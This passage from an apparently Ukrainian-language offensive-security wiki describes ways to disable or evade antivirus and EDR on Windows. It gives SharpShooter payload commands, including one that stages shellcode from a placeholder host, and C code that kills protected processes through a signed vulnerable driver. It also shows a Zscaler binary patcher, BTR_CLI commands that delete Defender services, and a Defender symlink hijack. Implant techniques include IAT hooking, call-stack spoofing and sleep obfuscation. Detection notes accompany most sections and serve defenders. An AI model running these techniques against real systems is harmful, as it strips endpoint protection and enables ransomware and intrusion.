- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання Python для створення інжекторів: приклад

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – знищення AV/EDR із простору ядра

Storm-2603 використала невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед розгортанням ransomware. Інструмент використовує **власний вразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій ядра, яким не можуть перешкодити навіть AV-сервіси Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: Файл, який записується на диск, має назву `ServiceMouse.sys`, але насправді це легітимно підписаний драйвер `AToolsKrnl64.sys` із «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується, навіть коли ввімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із користувацького простору.
3. **IOCTL-коди, доступні через драйвер**
   | Код IOCTL | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для зупинки служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний proof-of-concept на C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю оминає захисти в user-mode; код, що виконується в kernel, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти kernel незалежно від PPL/PP, ELAM чи інших функцій посилення захисту.

Виявлення / пом’якшення наслідків
• Увімкніть список заблокованих вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
• Відстежуйте створення нових служб *kernel* і сповіщайте, коли драйвер завантажується з каталогу, доступного для запису всім користувачам, або відсутній у списку дозволених.
• Відстежуйте дескриптори user-mode для спеціальних об’єктів пристроїв, за якими надходять підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector за допомогою патчення двійкових файлів на диску

**Client Connector** від Zscaler застосовує правила стану пристрою локально та покладається на Windows RPC для передавання результатів іншим компонентам. Обійти захист повністю можна через два слабкі рішення в дизайні:

1. Перевірка стану пристрою відбувається **повністю на стороні клієнта** (на сервер надсилається логічне значення).
2. Внутрішні кінцеві точки RPC перевіряють лише те, чи **підписаний Zscaler** виконуваний файл, який підключається (через `WinVerifyTrust`).<sup>[[11]](#references)</sup>

За допомогою **патчення чотирьох підписаних двійкових файлів на диску** можна нейтралізувати обидва механізми:

| Двійковий файл | Оригінальна логіка, яку патчать | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому всі перевірки вважаються успішними |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який процес (навіть непідписаний) може підключатися до каналів RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Пропущено |

Мінімальний фрагмент патчера:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану відображаються **зеленими/відповідними вимогам**.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки RPC через іменовані канали (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як кілька змін байтів можуть обійти рішення про довіру, що ухвалюються винятково на боці клієнта, і прості перевірки підписів.

## Зловживання довіреною функціональністю Microsoft Defender `BTR.sys`

Драйвер **Boot-Time Removal** у Defender — корисний контрприклад класичному BYOVD. `BTR.sys` — легітимний компонент усунення загроз, підписаний Microsoft; він не має помилки пошкодження пам’яті чи інтерфейсу IOCTL. Натомість після отримання прав адміністратора та `SeLoadDriverPrivilege` оператор може підробити приватну транзакцію усунення загроз і отримати доступ до передбачених операцій із файлами та реєстром на рівні Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початковий доступ чи підвищення привілеїв**. Драйвер можна витягти з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, замість того щоб імпортувати помітний сторонній драйвер.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender записує ресурс у файл із випадковою назвою `[a-z]{8}.sys` і реєструє однойменну службу ядра. `DriverEntry` читає значення `Args` служби, відкриває вказаний альтернативний потік даних NTFS, розшифровує та перевіряє список дій, записує дані зворотного зв’язку й після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб драйвер вивантажився, а не залишився резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один зашифрований RC4 блок. У проаналізованих збірках повторно використовується фіксований ключ довжиною 256 байтів, тож шифрування не є межею авторизації. Коректний відкритий текст містить глобальний заголовок довжиною 24 байти (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ID транзакції, отриманий із корисного навантаження), за яким ідуть шлях зворотного зв'язку у форматі UTF-16 із нульовим завершувачем і довільна кількість елементів. Кожен елемент має заголовок довжиною 16 байтів (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що завершуються **рівно чотирма нульовими байтами**. Кожна область заголовка/даних перевіряється окремо за допомогою CRC-32 із поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій надають доступ до цих примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалити файл, зокрема заблокований |
| 2 | `[UTF-16 path]` | Видалити порожній каталог |
| 3 | `[Flags][source][destination]` | Перемістити файл до захищеного шляху, вибраного зловмисником; порожнє значення destination означає видалення |
| 4 | `[Flags][key path]` | Рекурсивно видалити ключ реєстру |
| 5 | `[Flags][key path + "\\" + value]` | Видалити значення реєстру |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створити/оновити значення реєстру та створити відсутні шляхи ключів |

Для дій 5 і 6 роздільником ключа/значення у переданих даних є **дві послідовні зворотні скісні риски**; шлях у звичайному форматі не буде розділено коректно. Файл зворотного зв'язку здебільшого повторює запит, але перші чотири байти даних кожного елемента стають його результатом `NTSTATUS`. Для дій 1 і 2, у яких немає початкового поля flags, BTR переміщує шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Робочий процес `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік зворотного зв'язку, серіалізує/обчислює контрольні суми/шифрує ланцюжок дій, безпосередньо створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер як драйвер запуску системи для `-trigger boot`. Пряме внесення запису до реєстру обходить звичайний шлях SCM `CreateServiceW`, тому **не генерує** подію встановлення служби з ID 7045. Артефакти, створені для запуску під час завантаження, згодом можна видалити за допомогою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry` ще до готовності стека сховища та посилання `SystemRoot`. Натомість `Start=1` і група високого пріоритету `Boot Bus Extender` дають змогу виконати його на Phase 1: NTFS уже доступна, але багато драйверів безпеки із системним типом запуску та служби EDR у user mode ще не ініціалізовані. Фільтри з типом запуску boot-start, наприклад `WdFilter`, можуть бути вже завантажені, проте BTR може видалити їхні двійкові файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до того, як SCM їх запустить. ELAM не усуває цю прогалину, оскільки BTR запускається після оцінювання boot-start і має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в одній транзакції. У PoC передбачено Action 1 для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, потім обробляє власний запит на видалення й прибирає його перед вивантаженням. Це зменшує кількість доказів, а збереження відгуку у `<random>.sys:<random>.dat` дає змогу видалити драйвер і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції з високим рівнем сигналу

Правила, що перевіряють лише підпис, і список заблокованих вразливих драйверів Microsoft не захищають від зловживання передбаченими можливостями BTR. Надавайте перевагу наведеним поведінковим кореляціям, водночас відрізняючи легітимне походження від Defender від довільного процесу запуску.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є універсальним для розміщення BTR. ADS `.dat`, доданий до того самого `.sys`, особливо підозрілий, оскільки легітимний Defender зазвичай зберігає відгуки у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте безпосереднє створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>` зі значеннями `Args=...:changelist` і `Group=Boot Bus Extender`, якщо немає відповідної події інсталяції SCM.
- **Sysmon 6 -> 23:** корелюйте завантаження відомого драйвера BTR із походження, не пов’язаного з Defender, із подальшим видаленням файлів, яке виконує `System`/PID 4, особливо якщо йдеться про бінарні файли засобів безпеки.
- **Sysmon 11 -> 23:** створюйте сповіщення про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте й аудіюйте призначення/увімкнення `SeLoadDriverPrivilege`; одного підпису Microsoft недостатньо для довіри, якщо драйвер засобу безпеки розміщується за допомогою `cmd.exe`, PowerShell або невідомого процесу.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію рівнів/підписувачів, щоб втручатися один в одного могли лише захищені процеси з таким самим або вищим рівнем. Для наступу, якщо ви можете легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, можна перетворити нешкідливу функціональність (наприклад, ведення журналу) на обмежений примітив запису з підтримкою PPL, спрямований на захищені каталоги, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес запускався як PPL
- Цільовий EXE (і будь-які завантажені DLL) мають бути підписані EKU, сумісним із PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запитати сумісний рівень захисту, що відповідає підписувачу бінарного файлу (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів anti-malware, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильні рівні призведуть до помилки створення.

Також див. ширший вступ до PP/PPL і захисту LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Допоміжний інструмент із відкритим кодом: CreateProcessAsPPL (вибирає рівень захисту й передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Приклад використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-примітив: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає власний екземпляр і приймає параметр для запису файлу журналу за шляхом, указаним викликачем.
- Якщо його запущено як процес PPL, файл записується із захистом PPL.
- ClipUp не може обробляти шляхи з пробілами; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Помічники для коротких шляхів 8.3
- Переглянути короткі імена: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (абстрактно)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із прапорцем `CREATE_PROTECTED_PROCESS`, використавши лаунчер (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент для шляху до журналу, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо AV зазвичай відкриває/блокує цільовий бінарний файл під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, встановивши службу автозапуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження файл, записаний із захистом PPL, перезаписується до того, як AV заблокує його бінарні файли, що пошкоджує цільовий файл і не дає йому запуститися.

Приклад виклику (шляхи приховано/скорочено з міркувань безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Нотатки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, лише місце розташування; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби потрібні локальні права адміністратора/SYSTEM і можливість перезавантаження.
- Час має вирішальне значення: цільовий файл не повинен бути відкритим; виконання під час завантаження системи дає змогу уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо його запускають нестандартні батьківські процеси, під час завантаження системи.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і запуск перед Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів у бінарних файлах/каталогах Platform Defender; неочікуване створення/зміна файлів процесами з прапорцями захищених процесів.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL небінарними файлами AV.

Заходи пом’якшення
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і від яких батьківських процесів; блокуйте запуск ClipUp поза легітимними контекстами.
- Гігієна служб: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист від втручання Defender і захист раннього запуску ввімкнені; перевіряйте помилки запуску, які вказують на пошкодження бінарних файлів.
- Якщо це сумісно з вашим середовищем, розгляньте вимкнення генерації коротких імен 8.3 на томах, де розміщені засоби захисту (ретельно протестуйте).

## Втручання в Microsoft Defender через Platform Version Folder Symlink Hijack

Windows Defender визначає платформу, з якої запускається, перебираючи підпапки в:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підпапку з найбільшим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служб/реєстру). Під час вибору враховуються записи каталогів, зокрема точки повторної обробки каталогів (символічні посилання). Адміністратор може використати це, щоб перенаправити Defender до шляху, доступного для запису зловмисником, і виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний адміністратор (потрібен для створення каталогів/символічних посилань у папці Platform)
- Можливість перезавантажити систему або ініціювати повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані інструменти (mklink)

Чому це працює
- Defender блокує запис у власні папки, але під час вибору платформи довіряє записам каталогів і вибирає версію з найбільшим лексикографічним значенням, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте доступну для запису копію поточної папки платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть symlink каталогу з вищою версією всередині Platform, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендовано перезавантажити):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слідкуйте за новим шляхом процесу в `C:\TMP\AV\` і конфігурацією служби/реєстру, де має бути вказано це розташування.

Варіанти post-exploitation
- DLL sideloading/виконання коду: розмістіть або замініть DLL, які Defender завантажує з каталогу програми, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Зупинка служби/відмова в обслуговуванні: видаліть symlink версії, щоб під час наступного запуску налаштований шлях не вказував на потрібний файл і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує підвищення привілеїв; для її використання потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перенести runtime evasion із C2 implant безпосередньо в цільовий модуль, перехопивши його Import Address Table (IAT) і спрямувавши вибрані API через контрольований зловмисником position-independent code (PIC). Це дає змогу застосовувати evasion не лише до невеликої кількості API, доступних у багатьох kits (наприклад, CreateProcessA), а й поширити той самий захист на BOFs і post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід високого рівня
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (на початку модуля або як супровідний файл). PIC має бути самодостатнім і позиційно-незалежним.
- Під час завантаження host DLL пройдіться по її IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на прості PIC wrappers.
- Кожен PIC wrapper виконує evasion перед викликом справжньої адреси API хвостовим викликом. Типові прийоми evasion:
  - Маскування/демаскування пам’яті до та після виклику (наприклад, шифрування областей beacon, RWX→RX, зміна назв/дозволів сторінок).
  - Call-stack spoofing: створення нешкідливого стека й перехід до цільового API, щоб під час аналізу call stack визначалися очікувані фрейми.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, за допомогою якого скрипт Aggressor (або аналог) зможе реєструвати API для перехоплення в Beacon, BOFs і post-ex DLLs.

Чому тут використовується IAT hooking
- Працює з будь-яким кодом, який використовує перехоплений імпорт, без змін у коді інструмента й без залежності від того, чи проксить Beacon конкретні API.
- Охоплює post-ex DLLs: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати до їхніх викликів API ті самі прийоми маскування/обходу аналізу стека.
- Дає змогу надійно використовувати post-ex команди, що запускають процеси, проти засобів виявлення на основі call stack, перехоплюючи CreateProcessA/W.

Мінімальний ескіз IAT hook (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте патч після relocations/ASLR і до першого використання імпорту. Reflective loaders, як-от TitanLdr/AceLdr, демонструють перехоплення під час DllMain завантаженого модуля.
- Обгортки мають бути мінімальними й безпечними для PIC; справжній API слід отримувати через початкове значення IAT, збережене до патчингу, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки доступними для запису та виконання одночасно.

Stub для підміни call stack
- PIC stubs у стилі Draugr будують фальшивий ланцюжок викликів (return addresses у benign modules), а потім переходять до справжнього API.
- Це обходить детекції, які очікують канонічні стеки від Beacon/BOFs під час викликів чутливих API.
- Поєднуйте це з техніками stack cutting/stack stitching, щоб опинитися в очікуваних фреймах перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLL, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро застосовували той самий шлях ухилення без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси поза image (heap/anon); періодична перевірка import pointers.
- Аномалії стека: return addresses, що не належать завантаженим images; різкі переходи до не-image PIC; невідповідність у ланцюжку предків RtlUserThreadStart.
- Телеметрія loader: записи в IAT зсередини процесу, рання активність DllMain зі зміною import thunks, неочікувані RX regions, створені під час завантаження.
- Ухилення від image-load: якщо перехоплюєте LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані будівельні блоки та приклади
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Memory masking hooks (наприклад, simplehook) і stack-cutting PIC (stackcutting)
- PIC stubs для підміни call stack (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks через resident PICO

Якщо ви контролюєте reflective loader, можна перехоплювати імпорти **під час** `ProcessImports()`, замінивши вказівник loader на `GetProcAddress` власним resolver, який спершу перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (постійний об’єкт PIC), який зберігається після того, як transient loader PIC звільнить себе.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте пошук hooks на основі hash, наприклад `__resolve_hook(ror13hash(name))`. Якщо hook існує — повертайте його; інакше передавайте виклик справжньому `GetProcAddress`.
- Реєструйте цілі hooks під час лінкування за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається доступним, оскільки розміщений усередині resident PICO.

Так реалізується **перенаправлення IAT під час імпорту** без патчингу секції коду завантаженої DLL після завантаження.

### Примусове додавання imports, які можна перехопити, коли ціль використовує PEB-walking

Import-time hooks спрацьовують лише тоді, коли функція справді є в IAT цільового модуля. Якщо модуль розв’язує API через PEB-walk + hash (без запису імпорту), примусово додайте справжній import, щоб loader обробив його через `ProcessImports()`:

- Замініть розв’язання hashed export (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання, наприклад `&WaitForSingleObject`.
- Компілятор створить запис IAT, що дасть змогу перехопити імпорт під час його розв’язання reflective loader.

### Sleep/idle obfuscation у стилі Ekko без патчингу `Sleep()`

Замість патчингу `Sleep` перехоплюйте **фактичні wait/IPC primitives**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалого очікування обгорніть виклик у ланцюжок обфускації у стилі Ekko, який шифрує образ у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer`, щоб запланувати послідовність callbacks, які викликають `NtContinue` з підготовленими фреймами `CONTEXT`.
- Типовий ланцюжок (x64): встановити для образу `PAGE_READWRITE` → зашифрувати RC4 через `advapi32!SystemFunction032` увесь відображений образ → виконати блокувальне очікування → розшифрувати RC4 → **відновити дозволи для кожної секції**, пройшовши PE sections → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька фреймів і задайте регістри (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте “success” для тривалого очікування (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив виконання, поки образ замаскований. Цей шаблон приховує модуль від сканерів у періоди простою та дозволяє уникнути класичної сигнатури «patched `Sleep()`».

Ідеї для виявлення (на основі телеметрії)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суміжних буферів розміром із цілий образ.
- `VirtualProtect` для великого діапазону з подальшим відновленням дозволів для кожної секції.

### Runtime CFG registration для гаджетів sleep-obfuscation

У цілях із CFG перший непрямий перехід до гаджета всередині функції, наприклад `jmp [rbx]` або `jmp rdi`, зазвичай призводить до аварійного завершення процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки гаджета немає в метаданих CFG модуля. Щоб ланцюжки у стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Реєструйте кожну непряму ціль, яку використовує ланцюжок, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записи `CFG_CALL_TARGET_VALID`.
- Для адрес усередині завантажених images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси image** і охоплювати **повний розмір image**.
- Для вручну відображених/PIC/stomped regions використовуйте **базову адресу allocation** і її розмір.
- Позначайте не лише dispatch gadget, а й exports, до яких переходять непрямо (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які керовані атакувальником executable sections, які стануть непрямими цілями.

Це перетворює sleep chains у стилі ROP/JOP із «працює лише в процесах без CFG» на повторно використовуваний примітив для `explorer.exe`, браузерів, `svchost.exe` та інших систем, скомпільованих із `/guard:cf`.

### Підміна стека для sleeping threads із підтримкою CET

Повна заміна `CONTEXT` помітна й може спричинити проблеми в системах із CET Shadow Stack, оскільки підмінений `Rip` має відповідати апаратному shadow stack. Безпечніший шаблон маскування під час сну:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі та прочитайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть справжній TEB/TIB поточного потоку.
- Отримайте справжній контекст потоку, що засинає, за допомогою `GetThreadContext`.
- Скопіюйте в підмінений контекст **лише** справжній `Rip`, залишивши підмінений стан `Rsp`/стека без змін.
- Під час періоду сну скопіюйте `NT_TIB` підміненого потоку в TEB поточного потоку, щоб stack walkers розмотували стек у межах легітимного діапазону.
- Після завершення очікування відновіть початкові TIB і контекст потоку.

Це зберігає узгоджений із CET instruction pointer, водночас вводячи в оману EDR stack walkers, які покладаються на метадані стека TEB під час перевірки розмотування стека.

### Альтернатива на основі APC: Kraken Mask

